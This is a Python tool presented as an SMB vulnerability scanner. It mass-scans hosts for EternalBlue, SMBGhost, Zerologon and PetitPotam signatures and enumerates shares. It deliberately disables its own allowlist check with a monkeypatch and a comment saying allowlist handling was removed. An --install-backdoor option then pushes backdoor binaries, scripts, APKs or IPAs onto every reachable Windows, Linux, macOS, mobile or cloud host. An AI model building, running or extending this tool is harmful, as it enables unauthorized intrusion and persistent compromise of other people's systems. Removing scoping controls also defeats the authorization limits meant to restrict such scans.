#!/usr/bin/env python3
"""
SMB Vulnerability Scanner with Enhanced Debugging
Author: Security Researcher
Licence: MIT
"""
import random
import argparse
import sys
import os
import json
import ipaddress
import time
import socket
import threading
import concurrent.futures
import traceback
import re
from scanner import PublicIPFirewallSMB
from fingerprint import enumerate_samba_shares
from backdoor import (
    install_backdoor_windows,
    install_backdoor_linux,
    install_backdoor_macos,
    install_backdoor_android,
    install_backdoor_ios,
    install_backdoor_cloud,
)

# Disable allowlist filtering completely
PublicIPFirewallSMB._allowed = lambda self, t, nets, ips: True

# DNS Resolution Helper
def resolve_host(hostname):
    """Resolve hostname to IPv4 addresses"""
    try:
        return list(set(
            info[4][0]
            for info in socket.getaddrinfo(
                hostname, None, 
                family=socket.AF_INET, 
                type=socket.SOCK_STREAM
            )
        ))
    except socket.gaierror:
        return []  # Resolution failed

# Vulnerability Database
VULN_PATTERNS = {
    "eternalblue": {
        "signature": r"(?i)ms17-010|eternalblue",
        "ports": [445],
        "confidence": 0.9
    },
    "smbghost": {
        "signature": r"(?i)cve-2020-0796|smbghost",
        "ports": [445],
        "confidence": 0.85
    },
    "zerologon": {
        "signature": r"(?i)cve-2020-1472|zerologon",
        "ports": [445, 135],
        "confidence": 0.8
    },
    "petitpotam": {
        "signature": r"(?i)cve-2021-36942|petitpotam",
        "ports": [445, 135],
        "confidence": 0.75
    }
}

# Debug Helpers
def debug_print(title, data, level=1, max_length=500):
    """Enhanced debug printer with formatting and truncation"""
    if not data:
        return
        
    header = f"[DEBUG] {title} "
    separator = '=' * (78 - len(header))
    print(f"\n{header}{separator}", file=sys.stderr)
    if isinstance(data, dict):
        for k, v in data.items():
            if isinstance(v, bytes):
                v = v.hex() if len(v) < 50 else v[:50].hex() + "..."
            print(f"  {k.upper().ljust(15)}: {str(v)[:max_length]}", file=sys.stderr)
    elif isinstance(data, str):
        print(f"  {data[:max_length]}", file=sys.stderr)
    else:
        print(f"  {str(data)[:max_length]}", file=sys.stderr)
    print("=" * 78, file=sys.stderr)

def log_exception(context):
    """Log detailed exception information"""
    exc_type, exc_value, exc_traceback = sys.exc_info()
    print(f"\n[EXCEPTION] {context}", file=sys.stderr)
    print(f"  Type: {exc_type.__name__}", file=sys.stderr)
    print(f"  Message: {str(exc_value)}", file=sys.stderr)
    print("  Traceback:", file=sys.stderr)
    for line in traceback.format_tb(exc_traceback):
        for l in line.splitlines():
            print(f"    {l}", file=sys.stderr)

def analyze_vulnerabilities(scan_results):
    """Analyze scan results for potential vulnerabilities"""
    vulnerabilities = []
    
    for host, data in scan_results.items():
        if "error" in data:
            continue
            
        host_vulns = {"host": host, "vulnerabilities": []}
        
        # Check for known vulnerability patterns
        for vuln_id, pattern in VULN_PATTERNS.items():
            # Check if required ports are open
            port_match = False
            for port in pattern["ports"]:
                port_data = data.get("ports", {}).get(port, {})
                if port_data.get("state") == "open":
                    port_match = True
                    break
                    
            if not port_match:
                continue
                
            # Check banner for signatures
            banner = ""
            for port in [139, 445, 135]:
                port_data = data.get("ports", {}).get(port, {})
                banner += port_data.get("banner", "") + " "
                
            if re.search(pattern["signature"], banner):
                host_vulns["vulnerabilities"].append({
                    "id": vuln_id,
                    "confidence": pattern["confidence"],
                    "evidence": banner.strip()
                })
        
        # Check for anonymous access
        if "shares" in data:
            for share in data["shares"]:
                if "ACCESS_READ" in share.get("access", "") and "ANONYMOUS" in share.get("user", ""):
                    host_vulns["vulnerabilities"].append({
                        "id": "anonymous_access",
                        "confidence": 0.95,
                        "evidence": f"Share: {share['name']} - {share.get('access', '')}"
                    })
        
        if host_vulns["vulnerabilities"]:
            vulnerabilities.append(host_vulns)
            
    return vulnerabilities

def check_exploit_conditions(scan_data):
    """Check if conditions are suitable for exploit development"""
    conditions = []
    
    # Check for known vulnerable SMB versions
    if "smb_version" in scan_data:
        version = scan_data["smb_version"]
        if "SMBv1" in version:
            conditions.append({
                "type": "protocol",
                "risk": "critical",
                "message": "SMBv1 enabled - vulnerable to multiple exploits"
            })
    
    # Check for open dangerous ports
    dangerous_ports = {135, 139, 445, 3389}
    open_ports = [p for p, data in scan_data.get("ports", {}).items() 
                 if data.get("state") == "open"]
    
    for port in dangerous_ports:
        if port in open_ports:
            conditions.append({
                "type": "port",
                "port": port,
                "risk": "high",
                "message": f"Potentially vulnerable service on port {port}"
            })
    
    # Check for weak encryption
    if "encryption" in scan_data:
        if "NONE" in scan_data["encryption"] or "LOW" in scan_data["encryption"]:
            conditions.append({
                "type": "encryption",
                "risk": "medium",
                "message": "Weak encryption supported"
            })
    
    return conditions

# NEW FUNCTION: Print host scan results
def print_host_result(host, result, host_map):
    """Print formatted results for a single host"""
    # Show original hostname if resolved
    display_host = host
    if host in host_map and host_map[host] != host:
        display_host = f"{host} ({host_map[host]})"
    
    print(f"\nHost: {display_host}")
    
    # Handle scan errors
    if "error" in result:
        print(f"  Error: {result['error']}")
        return
    
    # Print NBNS status
    if "nbns" in result:
        print(f"  NBNS: {'positive' if result['nbns'] else 'negative'}")
    
    # Print SMB inferred status
    if "smb_inferred" in result:
        print(f"  SMB Inferred: {result['smb_inferred']}")
    
    # Print port statuses
    if "ports" in result and result["ports"]:
        print("  Ports:")
        for port, data in sorted(result["ports"].items()):
            state = data.get("state", "unknown")
            proto = data.get("protocol", "")
            
            # Build additional info string
            info_parts = []
            
            # SMB-specific info
            if "smb" in data:
                info_parts.append(f"SMB: {'positive' if data['smb'] else 'negative'}")
            
            # QUIC-specific info
            if "quic" in data:
                info_parts.append(f"QUIC: {'positive' if data['quic'] else 'negative'}")
            
            # Vulnerability info
            if "vuln" in data:
                info_parts.append(f"Vuln: response_len={data['vuln'].get('response_len', 'N/A')}")
            
            info_str = " - " + ", ".join(info_parts) if info_parts else ""
            print(f"    {port}/{proto}: {state}{info_str}")
    
    # Print any additional data
    for key in ["os", "smb_version", "encryption"]:
        if key in result:
            print(f"  {key.capitalize()}: {result[key]}")

# Share enumeration helper
def enumerate_and_print_shares(success, json_out=False, quiet=False):
    """Enumerate SMB shares and print results"""
    if json_out:
        share_data = []
    
    for r in success:
        host = r["details"]["host"]
        try:
            shares = enumerate_samba_shares(host)
            if not quiet:
                print(f"\n[+] Shares on {host}:")
                for share in shares:
                    print(f"  {share['name']} ({share.get('type', '?')}): {share.get('access', '?')}")
            
            if json_out:
                share_data.append({"host": host, "shares": shares})
        except Exception as exc:
            if not quiet:
                print(f"  Error enumerating shares: {exc}")
    
    if json_out:
        print(json.dumps(share_data, indent=2))

# Main Function
def main():
    ap = argparse.ArgumentParser(
        description="SMB vulnerability scanner with enhanced debugging",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("--host", action="append", default=[])
    ap.add_argument("--cidr", action="append", default=[])
    ap.add_argument("--input")
    ap.add_argument("--timeout", type=int, default=2)
    ap.add_argument("--workers", type=int, default=100)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--allowlist")
    ap.add_argument("--strategy", choices=["round"], default="round")
    ap.add_argument("--save")
    ap.add_argument("--reload")
    ap.add_argument("--asyncio", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    ap.add_argument("--debug", action="store_true", help="Enable detailed debugging output")
    ap.add_argument("--interval", type=int, default=600, help="Seconds between scans; 0 = no loop")
    # backdoor opts ---------------------------------------------------------
    ap.add_argument("--install-backdoor", action="store_true")
    ap.add_argument("--remote-os", choices=[
        "windows", "linux", "macos", "android", "ios", "aws", "azure", "gcp",
    ])
    ap.add_argument("--share")
    ap.add_argument("--key")
    ap.add_argument("--server-pubkey")
    ap.add_argument("--username")
    ap.add_argument("--password")
    ap.add_argument("--domain", default="")
    ap.add_argument("--use-kerberos", action="store_true")
    ap.add_argument("--aes-binary")
    ap.add_argument("--backdoor-binary")
    ap.add_argument("--backdoor-script")
    ap.add_argument("--backdoor-plist")
    ap.add_argument("--apk")
    ap.add_argument("--ipa")

    args = ap.parse_args()

    # Enable debug mode if requested
    debug_mode = args.debug and not args.quiet
    
    # Print debug header
    if debug_mode:
        debug_print("SCANNER ARGUMENTS", vars(args))
        debug_print("SYSTEM INFO", {
            "Python": sys.version,
            "Platform": sys.platform,
            "CWD": os.getcwd(),
            "User": os.getenv("USER")
        })

    # absolute-ify paths ----------------------------------------------------
    for k in (
        "input",
        "allowlist",
        "save",
        "reload",
        "key",
        "server_pubkey",
        "aes_binary",
        "backdoor_binary",
        "backdoor_script",
        "backdoor_plist",
        "apk",
        "ipa",
    ):
        val = getattr(args, k.replace("-", "_"))
        if val:
            setattr(args, k.replace("-", "_"), os.path.abspath(val))

    # gather targets --------------------------------------------------------
    hosts = args.host.copy()
    if args.input:
        try:
            with open(args.input) as fp:
                hosts.extend(h.strip() for h in fp if h.strip())
            if debug_mode:
                debug_print("INPUT FILE LOADED", {
                    "file": args.input,
                    "targets": hosts[len(args.host):]
                })
        except Exception as exc:
            print(f"[ERROR] Could not read {args.input}: {exc}", file=sys.stderr)
            sys.exit(1)
    cidrs = args.cidr.copy()

    # reload previous successful routes ------------------------------------
    if args.reload:
        prev = PublicIPFirewallSMB.load_routes(args.reload) or []
        for r in prev:
            h = r.get("details", {}).get("host") or r.get("host")
            if h and h not in hosts:
                hosts.append(h)
        if debug_mode:
            debug_print("RELOADED TARGETS", {
                "file": args.reload,
                "targets": [h for h in hosts if h not in args.host]
            })

    # REMOVED ALLOWLIST HANDLING COMPLETELY
    # Only require explicit targets
    if not hosts and not cidrs:
        print("[ERROR] No targets specified. Please provide targets via --host, --cidr, or --input.", file=sys.stderr)
        sys.exit(1)

    # Parallel DNS resolution
    resolved = []
    host_map = {}
    ip_hosts = []
    hostnames = []
    
    # Separate IPs and hostnames
    for h in hosts:
        try:
            ipaddress.ip_address(h)
            ip_hosts.append(h)
        except ValueError:
            hostnames.append(h)
    
    resolved = ip_hosts[:]  # Start with known IPs
    
    # Parallel DNS resolution for hostnames
    if hostnames:
        if not args.quiet:
            print(f"[DNS] Resolving {len(hostnames)} hostnames with {min(50, args.workers)} workers", file=sys.stderr)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, args.workers)) as executor:
            future_to_host = {executor.submit(resolve_host, host): host for host in hostnames}
            for future in concurrent.futures.as_completed(future_to_host):
                host = future_to_host[future]
                try:
                    ips = future.result()
                    if ips:
                        resolved.extend(ips)
                        for ip in ips:
                            host_map[ip] = host
                        if not args.quiet:
                            print(f"[DNS] {host} -> {', '.join(ips)}", file=sys.stderr)
                        if debug_mode:
                            debug_print("DNS RESOLUTION", {
                                "hostname": host,
                                "ip_addresses": list(ips)
                            })
                    else:
                        if not args.quiet:
                            print(f"[DNS] {host} resolution failed", file=sys.stderr)
                except Exception as exc:
                    if not args.quiet:
                        print(f"[DNS] Error resolving {host}: {exc}", file=sys.stderr)
                    log_exception(f"DNS resolution for {host}")
    
    if not args.quiet:
        print(f"[DNS] Total targets after resolution: {len(resolved)}", file=sys.stderr)
    hosts = resolved

    # Main scan loop
    first = True
    json_lock = threading.Lock() if args.save else None
    while True:
        if not first:
            if args.interval <= 0:
                break
            try:
                if not args.quiet:
                    print(f"[DBG] Sleeping {args.interval}s before next pass", file=sys.stderr)
                time.sleep(args.interval)
            except KeyboardInterrupt:
                print("[!] Interrupted. Exiting.", file=sys.stderr)
                break
        
        scanner = PublicIPFirewallSMB(
            allowlist=None,  # Disabled allowlist
            strategy=args.strategy,
            timeout=args.timeout,
            workers=args.workers,
            verbose=not args.quiet,
        )
        
        # Special handling for incremental scanning
        if not args.asyncio and args.save and len(hosts) > 50:
            if not args.quiet:
                print("[SCAN] Using incremental scanning with detailed output", file=sys.stderr)
            
            # We'll manage scanning manually to get per-host results
            targets = list(scanner._iter_targets(hosts, cidrs))
            filtered = scanner._filter_targets(targets)
            ordered = list(scanner._strategy_cls(filtered))
            scanner._results = {}
            scanner._skipped = []
            
            total_targets = len(ordered)
            completed = 0
            start_time = time.time()
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
                future_to_host = {ex.submit(scanner._probe_host, host): host for host in ordered}
                for future in concurrent.futures.as_completed(future_to_host):
                    host = future_to_host[future]
                    completed += 1
                    try:
                        result = future.result()
                        scanner._results[host] = result
                        
                        # Vulnerability analysis
                        if debug_mode:
                            vulns = analyze_vulnerabilities({host: result})
                            if vulns:
                                debug_print("VULNERABILITIES DETECTED", vulns)
                            
                            conditions = check_exploit_conditions(result)
                            if conditions:
                                debug_print("EXPLOIT CONDITIONS", conditions)
                        
                        if not args.quiet:
                            # Print detailed results to terminal
                            print_host_result(host, result, host_map)
                            
                            # Progress tracking
                            elapsed = time.time() - start_time
                            rate = completed / elapsed if elapsed > 0 else 0
                            remaining = total_targets - completed
                            eta = remaining / rate if rate > 0 else float('inf')
                            print(
                                f"[PROGRESS] {completed}/{total_targets} hosts "
                                f"({completed/total_targets*100:.1f}%) | "
                                f"Rate: {rate:.1f} hosts/sec | "
                                f"ETA: {eta:.1f} seconds",
                                file=sys.stderr
                            )
                        
                        # Incremental JSON save
                        if args.save:
                            with json_lock:
                                try:
                                    # Read existing data if available
                                    existing = {}
                                    if os.path.exists(args.save):
                                        with open(args.save) as f:
                                            existing = json.load(f)
                                    
                                    # Update with new results
                                    existing.update(scanner._results)
                                    
                                    # Write back to file
                                    with open(args.save, 'w') as f:
                                        json.dump(existing, f, indent=2)
                                except Exception as e:
                                    print(f"[ERROR] Failed to save incremental results: {e}", file=sys.stderr)
                                    log_exception("Saving incremental results")
                    
                    except Exception as e:
                        scanner._results[host] = {"error": str(e)}
                        if not args.quiet:
                            print(f"[ERROR] Scan failed for {host}: {e}", file=sys.stderr)
                        log_exception(f"Scanning host {host}")
            
            # Get successful routes after manual scan
            success = scanner.successful_routes()
            expanded = len(scanner._results) + len(scanner._skipped)
        
        else:
            # Original scanning method
            scanner.scan(hosts, cidrs, async_mode=args.asyncio)
            success = scanner.successful_routes()
            expanded = len(scanner._results) + len(scanner._skipped)
            
            if not args.quiet:
                # Print all results at once
                for host, result in scanner._results.items():
                    print_host_result(host, result, host_map)
                    
                    # Vulnerability analysis
                    if debug_mode:
                        vulns = analyze_vulnerabilities({host: result})
                        if vulns:
                            debug_print("VULNERABILITIES DETECTED", vulns)
                        
                        conditions = check_exploit_conditions(result)
                        if conditions:
                            debug_print("EXPLOIT CONDITIONS", conditions)
        
        if not args.quiet:
            print(f"[SCAN] Completed: {len(scanner._results)} hosts, "
                  f"{len(success)} successful, {len(scanner._skipped)} skipped")

        # Final JSON save (for asyncio mode or small scans)
        if args.save and (args.asyncio or len(hosts) <= 50):
            try:
                with open(args.save, "w") as fp:
                    json.dump(scanner._results, fp, indent=2)
                if not args.quiet:
                    print(f"[+] Results saved to {args.save}", file=sys.stderr)
            except Exception as exc:
                print(f"[ERROR] Could not save {args.save}: {exc}", file=sys.stderr)
                log_exception(f"Saving results to {args.save}")

        if args.json:
            print(json.dumps(success, indent=2))

        # Enumerate shares with enhanced debugging
        if debug_mode:
            for r in success:
                host = r["details"]["host"]
                try:
                    debug_print("SHARE ENUMERATION START", {"host": host})
                    shares = enumerate_samba_shares(host)
                    debug_print("SHARE ENUMERATION RESULT", {
                        "host": host,
                        "shares": shares
                    })
                except Exception as exc:
                    debug_print("SHARE ENUMERATION FAILED", {
                        "host": host,
                        "error": str(exc)
                    })
                    log_exception(f"Enumerating shares on {host}")
        else:
            enumerate_and_print_shares(success, json_out=args.json, quiet=args.quiet)

        # Backdoor installation logic (unchanged)
        if first and args.install_backdoor:
            missing = []
            if not args.remote_os:
                missing.append("--remote-os")
            if not args.username:
                missing.append("--username")
            if args.remote_os in ("linux", "macos", "android", "ios", "aws", "azure", "gcp") and not args.share:
                missing.append("--share")
            if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp"):
                if not args.key or not args.server_pubkey:
                    missing.append("--key/--server-pubkey")
                if not args.aes_binary or not args.backdoor_binary:
                    missing.append("--aes-binary/--backdoor-binary")
            if args.remote_os == "linux" and not args.backdoor_script:
                missing.append("--backdoor-script")
            if args.remote_os == "macos" and not args.backdoor_plist:
                missing.append("--backdoor-plist")
            if args.remote_os == "android" and not args.apk:
                missing.append("--apk")
            if args.remote_os == "ios" and not args.ipa:
                missing.append("--ipa")
            if args.remote_os in ("aws", "azure", "gcp") and not args.backdoor_script:
                missing.append("--backdoor-script")
            if missing:
                print("[ERROR] Missing args for backdoor: " + ", ".join(missing), file=sys.stderr)
            else:
                count = 0
                for r in success:
                    host = r["details"]["host"]
                    print(f"\n[!] BACKDOOR: {host} ({args.remote_os})")
                    
                    # Debug print backdoor parameters
                    if debug_mode:
                        debug_print("BACKDOOR PARAMETERS", {
                            "host": host,
                            "os": args.remote_os,
                            "username": args.username,
                            "share": args.share,
                            "key": args.key,
                            "server_pubkey": args.server_pubkey,
                            "aes_binary": args.aes_binary,
                            "backdoor_binary": args.backdoor_binary,
                            "backdoor_script": args.backdoor_script,
                            "backdoor_plist": args.backdoor_plist,
                            "apk": args.apk,
                            "ipa": args.ipa
                        })
                    
                    try:
                        if args.remote_os == "windows":
                            ok = install_backdoor_windows(
                                host=host,
                                username=args.username,
                                password=args.password or "",
                                private_key_path=args.key,
                                server_public_key_path=args.server_pubkey,
                                aes_binary_path=args.aes_binary,
                                backdoor_binary_path=args.backdoor_binary,
                                domain=args.domain,
                                use_kerberos=args.use_kerberos,
                            )
                        elif args.remote_os == "linux":
                            ok = install_backdoor_linux(
                                host=host,
                                share=args.share,
                                username=args.username,
                                password=args.password or "",
                                private_key_path=args.key,
                                server_public_key_path=args.server_pubkey,
                                aes_binary_path=args.aes_binary,
                                backdoor_binary_path=args.backdoor_binary,
                                backdoor_script_path=args.backdoor_script,
                            )
                        elif args.remote_os == "macos":
                            ok = install_backdoor_macos(
                                host=host,
                                share=args.share,
                                username=args.username,
                                password=args.password or "",
                                private_key_path=args.key,
                                server_public_key_path=args.server_pubkey,
                                aes_binary_path=args.aes_binary,
                                backdoor_binary_path=args.backdoor_binary,
                                backdoor_plist_path=args.backdoor_plist,
                            )
                        elif args.remote_os == "android":
                            ok = install_backdoor_android(
                                host=host,
                                share=args.share,
                                username=args.username,
                                password=args.password or "",
                                apks_path=args.apk,
                            )
                        elif args.remote_os == "ios":
                            ok = install_backdoor_ios(
                                host=host,
                                share=args.share,
                                username=args.username,
                                password=args.password or "",
                                ipas_path=args.ipa,
                            )
                        elif args.remote_os in ("aws", "azure", "gcp"):
                            ok = install_backdoor_cloud(
                                host=host,
                                share=args.share,
                                username=args.username,
                                password=args.password or "",
                                private_key_path=args.key,
                                server_public_key_path=args.server_pubkey,
                                aes_binary_path=args.aes_binary,
                                backdoor_binary_path=args.backdoor_binary,
                                backdoor_script_path=args.backdoor_script,
                                cloud_provider=args.remote_os,
                            )
                        else:
                            ok = False
                        if ok:
                            print(f"[+] BACKDOOR SUCCESS on {host}!")
                            count += 1
                        else:
                            print(f"[!] Backdoor failed on {host}.")
                    except Exception as exc:
                        print(f"[ERR] {host}: {exc}", file=sys.stderr)
                        log_exception(f"Installing backdoor on {host}")
                print(f"\n[+] Backdoor summary: {count}/{len(success)} succeeded")
        first = False

if __name__ == "__main__":
    main()